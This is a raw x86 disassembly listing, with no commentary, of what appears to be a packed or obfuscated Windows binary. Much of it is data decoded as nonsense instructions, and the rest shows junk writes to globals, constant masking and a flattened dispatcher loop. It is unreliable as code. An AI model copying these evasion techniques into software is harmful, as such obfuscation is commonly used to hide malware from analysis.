  4091ef:	add    bh,BYTE PTR [eax]
  4091f1:	out    0x89,eax
  4091f3:	push   0x6ad1de12
  4091f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091f9:	jo     0x409279
  4091fb:	sbb    eax,0x62588af6
  409200:	mov    esp,0xb6dd5ee
  409205:	xor    al,bh
  409207:	push   esi
  409208:	test   cl,ah
  40920a:	jecxz  0x4091a0
  40920c:	(bad)  
  40920d:	mov    dl,0x9
  40920f:	adc    eax,0x4a1b8744
  409214:	mov    fs,WORD PTR [eax-0x4b]
  409217:	outs   dx,BYTE PTR ds:[esi]
  409218:	xchg   ebp,eax
  409219:	imul   ebx,DWORD PTR [esi],0xd302cb04
  40921f:	das    
  409220:	jl     0x4091b9
  409222:	stos   DWORD PTR es:[edi],eax
  409223:	xor    eax,0xbd189a88
  409228:	test   BYTE PTR [ecx*4-0x600007ad],ah
  40922f:	fwait
  409230:	push   ebp
  409231:	push   esi
  409232:	push   es
  409233:	bound  ecx,QWORD PTR [eax-0x56]
  409236:	out    dx,al
  409237:	out    0x33,eax
  409239:	ud1    eax,DWORD PTR [ecx+0x6]
  40923d:	push   edx
  40923e:	sub    al,0x77
  409240:	shr    DWORD PTR [edi+0x35],1
  409243:	(bad)  
  409244:	aad    0xee
  409246:	xor    DWORD PTR [ecx+0x60],0xffffff89
  40924a:	push   edi
  40924b:	pusha  
  40924c:	fldpi  
  40924e:	add    ecx,DWORD PTR [ebx]
  409250:	and    al,0xd9
  409252:	xchg   esi,eax
  409253:	in     eax,0xa0
  409255:	sub    edx,DWORD PTR ds:0xa49c16e9
  40925b:	repz jl 0x40927a
  40925e:	(bad)  
  40925f:	fisttp QWORD PTR [edx]
  409261:	push   esi
  409262:	pop    ebp
  409263:	mov    BYTE PTR [edx-0x46],dh
  409266:	jns    0x409209
  409268:	or     al,0x35
  40926a:	sahf   
  40926b:	jg     0x409266
  40926d:	add    BYTE PTR ds:0x48324d63,0xa9
  409274:	test   al,0x32
  409276:	mov    bl,0xaf
  409278:	lahf   
  409279:	sub    esi,DWORD PTR [eax+0x2e]
  40927c:	push   eax
  40927d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40927e:	retf   0xa78c
  409281:	aad    0x4b
  409283:	mov    eax,ds:0x1d1c9538
  409288:	push   ds
  409289:	or     DWORD PTR [ebp+0x25a77a8f],edx
  40928f:	out    dx,al
  409290:	hlt    
  409291:	sbb    bl,BYTE PTR [ebp+0x38]
  409294:	in     al,dx
  409295:	imul   ebx,edx,0xfffffff5
  409298:	mov    ch,0x5c
  40929a:	pop    ecx
  40929b:	ins    BYTE PTR es:[edi],dx
  40929c:	dec    ecx
  40929d:	sbb    DWORD PTR [ecx+0x3b6db957],ecx
  4092a3:	xchg   DWORD PTR ds:0x49653a1f,edx
  4092a9:	mov    dh,BYTE PTR [ecx]
  4092ab:	xlat   BYTE PTR ds:[ebx]
  4092ac:	popf   
  4092ad:	je     0x40924c
  4092af:	fcomi  st,st(2)
  4092b1:	retf   
  4092b2:	inc    edx
  4092b3:	mov    al,ds:0xa2dc7db9
  4092b8:	js     0x4092dc
  4092ba:	pop    edx
  4092bb:	fstp   st(6)
  4092bd:	mov    DWORD PTR [eax+0x50ddb5f7],ecx
  4092c3:	adc    eax,0x10cde7f3
  4092c8:	cmc    
  4092c9:	loopne 0x4092da
  4092cb:	cwde   
  4092cc:	push   ebp
  4092cd:	push   ecx
  4092ce:	sahf   
  4092cf:	xor    esi,edx
  4092d1:	adc    BYTE PTR [eax],ch
  4092d3:	mov    bl,0xa8
  4092d5:	pop    edx
  4092d6:	cmp    DWORD PTR ds:0x1ebaabb9,esi
  4092dc:	jbe    0x4092bf
  4092de:	sbb    eax,0xcf8c0637
  4092e3:	adc    eax,0x26ae5dcf
  4092e8:	fidivr DWORD PTR [esi]
  4092ea:	xor    al,0x58
  4092ec:	jmp    0x5b6092f0
  4092f1:	sbb    BYTE PTR [edx],cl
  4092f3:	stos   DWORD PTR es:[edi],eax
  4092f4:	fcmovne st,st(4)
  4092f6:	lock inc esi
  4092f8:	and    BYTE PTR [ebp+eax*2-0x5e58c323],al
  4092ff:	jp     0x4092cb
  409301:	fs xchg esi,ebx
  409304:	call   0xa380:0xbb948745
  40930b:	mov    al,ds:0x6721958d
  409310:	mov    esi,0xe9b6e0a6
  409315:	sbb    edi,DWORD PTR [ebx+0x5c]
  409318:	xor    dh,BYTE PTR [eax]
  40931a:	je     0x409321
  40931c:	and    al,0xff
  40931e:	fs jl  0x409396
  409321:	arpl   si,bx
  409323:	lods   eax,DWORD PTR ds:[esi]
  409324:	ss xchg ecx,eax
  409326:	test   eax,0xa3bf5694
  40932b:	frstor [ebx]
  40932d:	and    ebp,ebx
  40932f:	lock nop
  409331:	adc    cl,BYTE PTR [edx]
  409333:	loope  0x40930a
  409335:	js     0x4092e7
  409337:	shr    edx,cl
  409339:	stos   BYTE PTR es:[edi],al
  40933a:	push   0xf82c3287
  40933f:	pop    esi
  409340:	fmul   QWORD PTR [ebx+0x74e9ec45]
  409346:	icebp  
  409347:	(bad)  
  409348:	dec    DWORD PTR [ebx+0x558bf445]
  40934e:	call   0x357e5586
  409353:	sbb    eax,0x840fa08c
  409358:	pop    esi
  409359:	icebp  
  40935a:	(bad)  
  40935b:	dec    DWORD PTR [ebx+0x81f045]
  409361:	add    DWORD PTR ds:0x50e90740,esi
  409367:	icebp  
  409368:	(bad)  
  409369:	dec    DWORD PTR [ebx+0x3839e445]
  40936f:	je     0x4084ba
  409375:	mov    eax,0x800f1c9c
  40937a:	jmp    0x4084c1
  40937f:	push   ebp
  409380:	mov    ebp,esp
  409382:	sub    esp,0x60
  409385:	adc    eax,DWORD PTR ds:0x4336e3
  40938b:	jmp    0x4094bf
  409390:	add    al,0xbb
  409392:	js     0x4093e4
  409394:	inc    ebx
  409395:	push   ebx
  409396:	push   esp
  409397:	dec    ebx
  409398:	xor    al,0xcd
  40939a:	in     al,dx
  40939b:	les    edi,FWORD PTR [eax]
  40939d:	inc    ebp
  40939e:	add    dl,bl
  4093a0:	sahf   
  4093a1:	in     eax,dx
  4093a2:	jl     0x409420
  4093a4:	adc    eax,0x6a7c7c7f
  4093a9:	iret   
  4093aa:	push   ecx
  4093ab:	repnz cmp ebp,edx
  4093ae:	dec    ebp
  4093af:	pop    edi
  4093b0:	add    ebx,esp
  4093b2:	out    0x8b,al
  4093b4:	inc    edx
  4093b5:	lea    esi,[edx]
  4093b7:	mov    ah,BYTE PTR [ebp-0x32922a21]
  4093bd:	mov    cl,BYTE PTR [ebx+0x72]
  4093c0:	jecxz  0x409440
  4093c2:	mov    ds:0x2220d48f,eax
  4093c7:	fsub   DWORD PTR [edx+esi*2+0x3ff81018]
  4093ce:	jmp    0xd4006c5d
  4093d3:	push   es
  4093d4:	outs   dx,DWORD PTR ds:[esi]
  4093d5:	scas   al,BYTE PTR es:[edi]
  4093d6:	mov    ds:0xef58f089,eax
  4093db:	and    esp,ebp
  4093dd:	je     0x40940d
  4093df:	mov    dh,0x39
  4093e1:	ret    
  4093e2:	add    DWORD PTR [ecx-0x6c8264d9],ebp
  4093e8:	stos   DWORD PTR es:[edi],eax
  4093e9:	out    0xe4,eax
  4093eb:	pop    ebp
  4093ec:	lods   eax,DWORD PTR ds:[esi]
  4093ed:	cld    
  4093ee:	fsub   st(7),st
  4093f0:	push   ds
  4093f1:	sar    DWORD PTR [esi],1
  4093f3:	fcomp  DWORD PTR ds:0xfa406ef5
  4093f9:	inc    edi
  4093fa:	aad    0x67
  4093fc:	jne    0x4093ed
  4093fe:	add    BYTE PTR [edi+0xfabe996],0x30
  409405:	mov    bh,0xc4
  409407:	rol    DWORD PTR [edi],1
  409409:	enter  0x985a,0xfe
  40940d:	push   edi
  40940e:	sbb    eax,0xdd07d58c
  409413:	adc    cl,BYTE PTR [edi-0x156ae325]
  409419:	jge    0x409484
  40941b:	xchg   DWORD PTR [esi-0x61],ebp
  40941e:	push   0x86573551
  409423:	mov    edx,0x8f33d50
  409428:	jge    0x4093bf
  40942a:	or     edi,ecx
  40942c:	sbb    ebx,ebx
  40942e:	in     eax,0x3
  409430:	imul   ecx,DWORD PTR [ecx-0x3d],0xffffff85
  409434:	inc    esp
  409435:	jns    0x40941a
  409437:	adc    DWORD PTR [ecx],edi
  409439:	stos   DWORD PTR es:[edi],eax
  40943a:	loopne 0x409489
  40943c:	mov    ds:0xaaa2c799,eax
  409441:	ficomp WORD PTR [eax+0x1fc69e2]
  409447:	std    
  409448:	lea    edx,[ecx]
  40944a:	daa    
  40944b:	ss inc eax
  40944d:	ss add ebp,esp
  409450:	mov    dh,bh
  409452:	(bad)
  409456:	jbe    0x4093e9
  409458:	add    ecx,DWORD PTR [esi+0x580d73bd]
  40945e:	fmul   DWORD PTR [ebx-0x5f]
  409461:	ret    0xa62d
  409464:	push   ds
  409465:	imul   edi,DWORD PTR [edx],0xa669710
  40946b:	pop    ecx
  40946c:	test   eax,0x2697c9b7
  409471:	gs push ds
  409473:	sub    eax,0xa36aaebd
  409478:	adc    eax,0x7f582e83
  40947d:	mov    ds:0xfea69953,eax
  409482:	mul    DWORD PTR [ecx]
  409484:	scas   eax,DWORD PTR es:[edi]
  409485:	call   0x6258:0xe7b74da2
  40948c:	inc    eax
  40948d:	cmc    
  40948e:	daa    
  40948f:	ja     0x4094fb
  409491:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409492:	ficomp WORD PTR [edi+0x5d]
  409495:	or     dl,BYTE PTR [ecx]
  409497:	jns    0x4094cb
  409499:	xchg   esp,eax
  40949a:	sbb    al,0x8a
  40949c:	xor    bh,al
  40949e:	rol    BYTE PTR ds:0xb41c2c7f,cl
  4094a4:	out    0xda,al
  4094a6:	xchg   esp,eax
  4094a7:	inc    esp
  4094a8:	sub    edi,edx
  4094aa:	out    dx,al
  4094ab:	mov    eax,?
  4094ad:	ss out 0xb1,eax
  4094b0:	sbb    eax,0x43fe1f8a
  4094b5:	xchg   BYTE PTR [ecx-0x7dbaf87d],bl
  4094bb:	mov    esi,0x8ba01e2f
  4094c0:	inc    ebp
  4094c1:	or     BYTE PTR [ecx+0x4336e70d],al
  4094c7:	add    BYTE PTR [eax],bh
  4094c9:	or     al,0x0
  4094cb:	add    BYTE PTR [ebx-0x7f],dl
  4094ce:	adc    eax,0x433657
  4094d3:	inc    edi
  4094d4:	popa   
  4094d5:	add    BYTE PTR [eax],al
  4094d7:	push   esi
  4094d8:	mov    esi,0x7510853
  4094dd:	add    DWORD PTR ds:0x433767,0x296a
  4094e7:	xor    eax,esi
  4094e9:	and    ebx,0x43d6
  4094ef:	mov    ebx,0x32729a
  4094f4:	and    DWORD PTR ds:0x43365f,0x433657
  4094fe:	add    eax,ebx
  409500:	adc    DWORD PTR ds:0x43375f,0x1959
  40950a:	push   edi
  40950b:	or     DWORD PTR ds:0x4336ab,ecx
  409511:	mov    DWORD PTR [ebp-0x18],eax
  409514:	and    DWORD PTR ds:0x43365b,0x4f47
  40951e:	mov    edi,DWORD PTR [ebp+0x8]
  409521:	xor    edi,esi
  409523:	sbb    DWORD PTR ds:0x4336af,0x43376b
  40952d:	mov    DWORD PTR [ebp-0xc],0xf89c85f5
  409534:	or     DWORD PTR ds:0x4336af,0x30d7
  40953e:	mov    DWORD PTR [ebp-0x10],0xf89c8735
  409545:	add    DWORD PTR ds:0x433667,0x43372f
  40954f:	add    edi,ebx
  409551:	jmp    0x4099a2
  409556:	mov    DWORD PTR ds:0x433697,0x217e
  409560:	cmp    edi,0x40
  409563:	mov    DWORD PTR ds:0x4336ef,0x49f
  40956d:	jne    0x4095a6
  409573:	mov    DWORD PTR ds:0x43376b,ecx
  409579:	mov    eax,ds:0x413996
  40957e:	mov    eax,DWORD PTR [eax]
  409580:	mov    DWORD PTR ds:0x433663,0x21e9
  40958a:	mov    DWORD PTR [ebp-0x14],eax
  40958d:	mov    eax,ds:0x413b9e
  409592:	mov    DWORD PTR ds:0x43372f,0x54b7
  40959c:	mov    eax,DWORD PTR [eax]
  40959e:	mov    DWORD PTR [ebp-0x18],eax
  4095a1:	jmp    0x409996
  4095a6:	mov    DWORD PTR ds:0x43364b,0x76e8
  4095b0:	jmp    0x4096e4
  4095b5:	and    al,0x36
  4095b7:	popf   
  4095b8:	les    ebx,FWORD PTR [ebp-0x6f09829d]
  4095be:	lahf   
  4095bf:	jmp    0x40958c
  4095c1:	fld    QWORD PTR [esi+edx*8]
  4095c4:	or     esi,DWORD PTR [edi+0x157c7cec]
  4095ca:	jg     0x409648
  4095cc:	jl     0x40962d
  4095ce:	mov    ch,0xbd
  4095d0:	fisttp WORD PTR [edx+0x3]
  4095d3:	mov    ds:0xdb7a6d29,eax
  4095d9:	aas    
  4095da:	sti    
  4095db:	adc    DWORD PTR [eax-0x2],ecx
  4095de:	dec    ecx
  4095df:	mov    edi,0x8550ff1d
  4095e4:	in     al,0xc9
  4095e6:	ror    DWORD PTR [edx-0x24dd6b2d],1
  4095ec:	mov    ds:0xb2845d47,eax
  4095f1:	rcr    BYTE PTR [edx],cl
  4095f3:	data16 in al,dx
  4095f5:	jns    0x409590
  4095f7:	pop    ebx
  4095f8:	jmp    0xe664:0x23d32eb6
  4095ff:	dec    ebp
  409600:	xor    edx,edi
  409602:	mov    bl,0xfa
  409604:	test   BYTE PTR [edi+0xf],0xfb
  409608:	sub    esi,ebx
  40960a:	push   0x54b38ef
  40960f:	cmp    eax,0x39193d15
  409614:	mov    eax,0x2952d321
  409619:	pop    es
  40961a:	pop    ss
  40961b:	test   eax,0xf5e2b284
  409620:	stos   BYTE PTR es:[edi],al
  409621:	dec    ebp
  409622:	xchg   DWORD PTR [edx],esi
  409624:	in     eax,dx
  409625:	int3   
  409626:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409627:	cmp    eax,0x10faaab4
  40962c:	popa   
  40962d:	mov    eax,0x13181a37
  409632:	mov    ch,0x1b
  409634:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409635:	ret    0x99c9
  409638:	clc    
  409639:	out    dx,eax
  40963a:	pop    DWORD PTR [eax]
  40963c:	xor    cl,dh
  40963e:	pop    edi
  40963f:	std    
  409640:	bound  eax,QWORD PTR [eax+0x4257cfe]
  409646:	fild   DWORD PTR [ecx+0x7db32255]
  40964c:	js     0x4096ba
  40964e:	mov    edi,0x3c159caf
  409653:	xchg   ebp,eax
  409654:	fdiv   QWORD PTR [ecx+0x24]
  409657:	mov    edx,0xf3042c6c
  40965c:	adc    eax,0x610f3326
  409661:	data16 das 
  409663:	push   edi
  409664:	pop    ebp
  409665:	stos   DWORD PTR es:[edi],eax
  409666:	aad    0x75
  409668:	shr    DWORD PTR ds:0x6bcc100,cl
  40966e:	fcomip st,st(3)
  409670:	test   ecx,ebp
  409672:	sbb    eax,0x12581310
  409677:	shl    BYTE PTR [eax],1
  409679:	dec    esi
  40967a:	push   eax
  40967b:	retf   
  40967c:	dec    edi
  40967d:	push   ds
  40967e:	stos   BYTE PTR es:[edi],al
  40967f:	(bad)
  409684:	mov    al,0x9e
  409686:	cwde   
  409687:	xchg   esp,eax
  409688:	adc    al,0xf7
  40968a:	push   0xfffffff2
  40968c:	cmp    eax,ecx
  40968e:	push   ebx
  40968f:	jb     0x409663
  409691:	push   eax
  409692:	xor    ecx,DWORD PTR [ecx+0x72]
  409695:	pop    esi
  409696:	jmp    0x5c60:0x301b0336
  40969d:	les    ebp,FWORD PTR [esi-0x2a089dd2]
  4096a3:	fild   QWORD PTR [esi-0x2a]
  4096a6:	(bad)  
  4096a7:	cmp    DWORD PTR [edx],ebp
  4096a9:	ins    DWORD PTR es:[edi],dx
  4096aa:	pop    edi
  4096ab:	lods   al,BYTE PTR ds:[esi]
  4096ac:	cmp    ebp,edx
  4096ae:	out    0xb1,eax
  4096b0:	sub    eax,DWORD PTR [ecx]
  4096b2:	pop    ebp
  4096b3:	stc    
  4096b4:	dec    ebp
  4096b5:	push   esp
  4096b6:	adc    al,ah
  4096b8:	in     eax,dx
  4096b9:	loopne 0x409674
  4096bb:	jne    0x409640
  4096bd:	jge    0x40965c
  4096bf:	int3   
  4096c0:	out    dx,al
  4096c1:	call   0xeb5f:0xed2dc55a
  4096c8:	ins    DWORD PTR es:[edi],dx
  4096c9:	cmp    eax,0x381acac5
  4096ce:	int    0x69
  4096d0:	ss aaa 
  4096d2:	mov    ds:0x60a15f3f,eax
  4096d7:	xor    al,0x90
  4096d9:	cmp    DWORD PTR [esi+0x50],esi
  4096dc:	pop    ds
  4096dd:	pop    ds
  4096de:	cmp    ebp,DWORD PTR [edi]
  4096e0:	fstp   QWORD PTR [esi-0x23]
  4096e3:	fild   DWORD PTR [ecx+0x33dff]
  4096e9:	add    bh,al
  4096eb:	add    eax,0x4336d7
  4096f0:	xchg   edi,eax
  4096f1:	add    DWORD PTR [eax],eax
  4096f3:	add    BYTE PTR [edi],cl
  4096f5:	test   DWORD PTR [eax+eax*1+0x0],ebp
  4096f9:	add    BYTE PTR [ebx-0x74fff79b],al
  4096ff:	inc    ebp
  409700:	clc    
  409701:	or     DWORD PTR ds:0x433723,0x4336e3
  40970b:	sub    eax,DWORD PTR [ebp+0x8]
  40970e:	push   eax
  40970f:	mov    eax,ds:0x433763
  409714:	or     DWORD PTR ds:0x433723,eax
  40971a:	mov    eax,DWORD PTR [ebp-0x4]
  40971d:	add    DWORD PTR ds:0x43363f,0x4336af
  409727:	add    eax,DWORD PTR [ebp+0x8]
  40972a:	sub    DWORD PTR ds:0x433727,0x4336a7
  409734:	push   eax
  409735:	dec    DWORD PTR ds:0x43364b
  40973b:	call   0x4099bc
  409740:	mov    DWORD PTR ds:0x433717,0x29a7
  40974a:	inc    DWORD PTR [ebp+0x8]
  40974d:	cmp    DWORD PTR [ebp+0x8],0x52
  409751:	mov    DWORD PTR ds:0x43365f,0x7d48
  40975b:	jb     0x4096fe
  409761:	jmp    0x409996
  409766:	mov    DWORD PTR ds:0x4336ef,0x5779
  409770:	cmp    edi,0x1a3
  409776:	mov    DWORD PTR ds:0x433767,0x175d
  409780:	jne    0x409964
  409786:	movzx  eax,BYTE PTR ds:0x43363f
  40978d:	and    DWORD PTR ds:0x4336af,eax
  409793:	mov    DWORD PTR [ebp-0x60],0xf89c8539
  40979a:	add    DWORD PTR ds:0x43372f,ebx
  4097a0:	mov    eax,DWORD PTR [ebp-0x4]
  4097a3:	xor    DWORD PTR ds:0x43369f,0x2808
  4097ad:	mov    DWORD PTR [ebp-0x5c],eax
  4097b0:	sub    eax,DWORD PTR ds:0x4336e7
  4097b6:	mov    eax,DWORD PTR [ebp-0x8]
  4097b9:	mov    DWORD PTR [ebp-0x58],eax
  4097bc:	mov    eax,DWORD PTR [ebp-0xc]
  4097bf:	xor    eax,esi
  4097c1:	and    DWORD PTR ds:0x433727,0x5f09
  4097cb:	add    eax,ebx
  4097cd:	and    DWORD PTR ds:0x43365f,0x3046
  4097d7:	mov    DWORD PTR [ebp-0x54],eax
  4097da:	sbb    DWORD PTR ds:0x4336eb,0x433733
  4097e4:	lea    eax,[ebp-0x1c]
  4097e7:	add    DWORD PTR ds:0x43371b,0x7d23
  4097f1:	mov    DWORD PTR [ebp-0x50],eax
  4097f4:	sub    eax,DWORD PTR ds:0x43365f
  4097fa:	mov    eax,DWORD PTR [ebp-0x60]
  4097fd:	or     DWORD PTR ds:0x4336b3,0x4336af
  409807:	xor    eax,esi
  409809:	add    eax,ebx
  40980b:	mov    DWORD PTR [ebp-0x60],eax
  40980e:	lea    eax,[ebp-0x60]
  409811:	push   eax
  409812:	mov    eax,DWORD PTR [ebp+0xc]
  409815:	jmp    0x409949
  40981a:	xchg   cl,bl
  40981c:	fs jg  0x409886
  40981f:	and    DWORD PTR [ecx+0x61],0x87fe859e
  409826:	jecxz  0x40981f
  409828:	sbb    eax,0x7cef4c63
  40982d:	jl     0x409844
  40982f:	jg     0x4098ad
  409831:	jl     0x4097cf
  409833:	(bad)  
  409834:	fmul   st,st(7)
  409836:	(bad)  
  409837:	lock js 0x4097f7
  40983a:	mov    edi,0x791fbb52
  40983f:	push   0x14
  409841:	fs daa 
  409843:	bound  edi,QWORD PTR ds:0x4dc95512
  409849:	(bad)  
  40984a:	sub    BYTE PTR [ecx],cl
  40984c:	jmp    0x409885
  40984e:	(bad)
  409852:	cdq    
  409853:	lahf   
  409854:	lahf   
  409855:	push   ss
  409856:	(bad)  
  409857:	sub    esp,DWORD PTR [edx+0x445d35a1]
  40985d:	mov    ah,0xcf
  40985f:	push   cs
  409860:	cmp    ah,dh
  409862:	and    DWORD PTR [ebx],0xcbfa70c0
  409868:	dec    ebp
  409869:	xchg   BYTE PTR [edi+0x502171ca],dh
  40986f:	sbb    edi,DWORD PTR [edx-0x75ca66]
  409875:	lock test al,0x85
  409878:	jne    0x4098f3
  40987a:	ficomp WORD PTR [ebp-0x5f]
  40987d:	push   0x287edc1
  409882:	(bad)  
  409883:	jmp    0x409902
  409885:	pop    ss
  409886:	sbb    DWORD PTR [ebx+0x2ca1d69d],ebx
  40988c:	mov    al,ds:0xf8ede2fd
  409891:	fistp  DWORD PTR [ecx+0x38f655df]
  409897:	adc    eax,0x189c114f
  40989c:	or     eax,0x9fc12f8a
  4098a1:	in     eax,0xb7
  4098a3:	not    BYTE PTR [edi+0x529404f3]
  4098a9:	or     ebp,DWORD PTR [ebx+0x5a]
  4098ac:	test   al,0x96
  4098ae:	inc    ecx
  4098af:	xchg   ecx,eax
  4098b0:	inc    ebp
  4098b1:	adc    DWORD PTR ds:0xf6045594,eax
  4098b7:	dec    esi
  4098b8:	xor    dl,dh
  4098ba:	popf   
  4098bb:	sub    esp,DWORD PTR [esi]
  4098bd:	jmp    0x987bc3a9
  4098c2:	imul   esp,DWORD PTR [ecx+0x79648480],0xede521c0
  4098cc:	and    dh,BYTE PTR [edi+eiz*2-0xc]
  4098d0:	retf   
  4098d1:	sbb    ah,bl
  4098d3:	popa   
  4098d4:	push   ds
  4098d5:	rol    esi,1
  4098d7:	pop    ebx
  4098d8:	sub    dl,dh
  4098da:	daa    
  4098db:	jo     0x4098f5
  4098dd:	pop    edi
  4098de:	xor    edx,DWORD PTR [esi+0x39777fdb]
  4098e4:	sahf   
  4098e5:	es or  dl,ah
  4098e8:	imul   BYTE PTR [eax+0x7e]
  4098eb:	jbe    0x4098b7
  4098ed:	sbb    al,0x2c
  4098ef:	(bad)  
  4098f0:	ins    DWORD PTR es:[edi],dx
  4098f1:	out    0x86,al
  4098f3:	test   al,0x73
  4098f5:	mov    cl,0x9d
  4098f7:	pop    es
  4098f8:	xchg   BYTE PTR [ebx+0x57],ah
  4098fb:	cld    
  4098fc:	into   
  4098fd:	and    eax,0x906bf6f2
  409902:	test   BYTE PTR [ecx],dl
  409904:	mov    ecx,0x759874f
  409909:	sar    edi,cl
  40990b:	retf   
  40990c:	retf   
  40990d:	test   eax,esi
  40990f:	mov    edx,DWORD PTR ds:0x220a524a
  409915:	pop    es
  409916:	and    al,0xa3
  409918:	add    BYTE PTR [esi],bl
  40991a:	mov    bh,0x65
  40991c:	lahf   
  40991d:	and    DWORD PTR [ecx+ecx*2+0x35ea42ae],0x35
  409925:	jbe    0x409933
  409927:	fdivr  st,st(6)
  409929:	daa    
  40992a:	aas    
  40992b:	mov    WORD PTR [ecx-0x2106dee9],ss
  409931:	leave  
  409932:	outs   dx,DWORD PTR ds:[esi]
  409933:	adc    al,0xa9
  409935:	enter  0xe424,0x7f
  409939:	inc    ebx
  40993a:	inc    ebx
  40993b:	sub    bh,al
  40993d:	test   eax,0x64777f17
  409943:	dec    ecx
  409944:	std    
  409945:	daa    
  409946:	pop    esi
  409947:	cdq    
  409948:	dec    esi
  409949:	xor    eax,esi
  40994b:	add    eax,ebx
  40994d:	push   eax
  40994e:	mov    eax,ds:0x413b36
  409953:	push   0x413a8c
  409958:	push   DWORD PTR [eax]
  40995a:	call   0x4100b5
  40995f:	jmp    0x409996
  409964:	cmp    edi,0x13d
  40996a:	jne    0x409996
  409970:	mov    eax,DWORD PTR [ebp-0x10]
  409973:	xor    eax,esi
  409975:	add    eax,ebx
  409977:	mov    DWORD PTR [ebp+0x8],eax
  40997a:	mov    eax,ds:0x413b16
  40997f:	mov    DWORD PTR [ebp+0x8],eax
  409982:	mov    eax,DWORD PTR [ebp-0x14]
  409985:	mov    DWORD PTR [ebp-0x4],eax
  409988:	mov    eax,DWORD PTR [ebp-0x4]
  40998b:	push   0x4
  40998d:	pop    ecx
  40998e:	sub    ecx,eax
  409990:	add    ecx,DWORD PTR [ebp-0x18]
  409993:	mov    DWORD PTR [ebp-0x8],ecx
  409996:	mov    eax,DWORD PTR [ebp+0xc]
  409999:	xor    eax,esi
  40999b:	lea    edi,[edi+eax*1+0x32729a]
  4099a2:	cmp    edi,0x50b
  4099a8:	jne    0x409556
  4099ae:	mov    eax,DWORD PTR [ebp+0xc]
  4099b1:	pop    edi
  4099b2:	xor    eax,esi
  4099b4:	pop    esi
  4099b5:	add    eax,ebx
  4099b7:	pop    ebx
  4099b8:	leave  
  4099b9:	ret    0x8
  4099bc:	push   ebp
  4099bd:	mov    ebp,esp
  4099bf:	sub    esp,0x44
  4099c2:	neg    edx
  4099c4:	push   edi
  4099c5:	mov    eax,DWORD PTR [ebp+0xc]
  4099c8:	mov    edi,DWORD PTR ds:0x433733
  4099ce:	sub    DWORD PTR ds:0x43363f,edi
  4099d4:	mov    DWORD PTR [ebp-0x10],eax
  4099d7:	and    DWORD PTR ds:0x4336ef,0x1af7
  4099e1:	mov    eax,DWORD PTR [ebp+0x8]
  4099e4:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  4099eb:	and    DWORD PTR ds:0x43372f,ebx
  4099f1:	mov    DWORD PTR [ebp-0x20],0xf89c8534
  4099f8:	or     DWORD PTR ds:0x4336b3,ebx
  4099fe:	mov    edx,DWORD PTR [ebp+0x8]
  409a01:	add    DWORD PTR ds:0x43364f,ebx
  409a07:	mov    DWORD PTR [ebp-0x40],eax
  409a0a:	mov    eax,0x7510853
  409a0f:	mov    DWORD PTR ds:0x4336e3,0x1e
  409a19:	cmp    DWORD PTR ds:0x4336e3,0x0
  409a20:	je     0x409a5e
  409a26:	cmp    DWORD PTR ds:0x4336e3,0x20
  409a2d:	jne    0x409a46
  409a33:	push   DWORD PTR [ebp-0xc]
  409a36:	push   0x43371b
  409a3b:	push   0x4dbc
  409a40:	call   DWORD PTR ds:0x412198
  409a46:	mov    edi,DWORD PTR ds:0x4336e3
  409a4c:	dec    edi
  409a4d:	mov    DWORD PTR ds:0x4336e3,edi
  409a53:	jmp    0x409a19
  409a58:	sbb    DWORD PTR ds:0x433773,ebx
  409a5e:	xor    edx,eax
  409a60:	and    DWORD PTR ds:0x4336db,0x1370
  409a6a:	mov    ecx,0x32729a
  409a6f:	xor    edi,DWORD PTR ds:0x433653
  409a75:	add    edx,ecx
  409a77:	adc    edi,0x4100
  409a7d:	mov    DWORD PTR [ebp-0x8],edx
  409a80:	mov    DWORD PTR ds:0x43363f,0x11
  409a8a:	cmp    DWORD PTR ds:0x43363f,0x0
  409a91:	je     0x409aec
  409a97:	cmp    DWORD PTR ds:0x43363f,0x6
  409a9e:	jne    0x409ab4
  409aa4:	push   0x53f1
  409aa9:	push   0x7cf0
  409aae:	call   DWORD PTR ds:0x412260
  409ab4:	cmp    DWORD PTR ds:0x43363f,0x7
  409abb:	jne    0x409ad0
  409ac1:	xor    edi,edi
  409ac3:	add    edi,DWORD PTR ds:0x43363f
  409ac9:	dec    edi
  409aca:	mov    DWORD PTR ds:0x43363f,edi
  409ad0:	mov    edi,DWORD PTR ds:0x43363f
  409ad6:	dec    edi
  409ad7:	mov    DWORD PTR ds:0x43363f,edi
  409add:	jmp    0x409a8a
  409ae2:	add    DWORD PTR ds:0x43372b,0x300c
  409aec:	mov    edx,DWORD PTR [ebp+0x8]
  409aef:	and    DWORD PTR ds:0x4336a3,0x0
  409af9:	jmp    0x409b0b
  409afe:	mov    edi,DWORD PTR ds:0x4336a3
  409b04:	inc    edi
  409b05:	mov    DWORD PTR ds:0x4336a3,edi
  409b0b:	cmp    DWORD PTR ds:0x4336a3,0x1c
  409b12:	jae    0x409b5e
  409b18:	cmp    DWORD PTR ds:0x4336a3,0x5
  409b1f:	jne    0x409b33
  409b25:	push   0x776c
  409b2a:	push   DWORD PTR [ebp-0x18]
  409b2d:	call   DWORD PTR ds:0x41219c
  409b33:	cmp    DWORD PTR ds:0x4336a3,0x4
  409b3a:	jne    0x409b4f
  409b40:	xor    edi,edi
  409b42:	xor    edi,DWORD PTR ds:0x4336a3
  409b48:	inc    edi
  409b49:	mov    DWORD PTR ds:0x4336a3,edi
  409b4f:	jmp    0x409afe
  409b54:	or     DWORD PTR ds:0x433717,0x2a5
  409b5e:	xor    edx,eax
  409b60:	or     edi,DWORD PTR ds:0x433697
  409b66:	add    edx,ecx
  409b68:	xor    edi,edi
  409b6a:	add    edi,DWORD PTR ds:0x43372f
  409b70:	or     edi,DWORD PTR ds:0x43369f
  409b76:	mov    DWORD PTR ds:0x43372f,edi
  409b7c:	mov    DWORD PTR [ebp+0xc],edx
  409b7f:	and    DWORD PTR ds:0x4336a3,0x414e
  409b89:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  409b90:	xor    edx,edx
  409b92:	xor    edx,DWORD PTR ds:0x433773
  409b98:	and    edx,DWORD PTR ds:0x433657
  409b9e:	mov    DWORD PTR ds:0x433773,edx
  409ba4:	mov    DWORD PTR [ebp-0x28],0xf89c853b
  409bab:	mov    DWORD PTR ds:0x4336af,0x15
  409bb5:	cmp    DWORD PTR ds:0x4336af,0x0
  409bbc:	je     0x409c5d
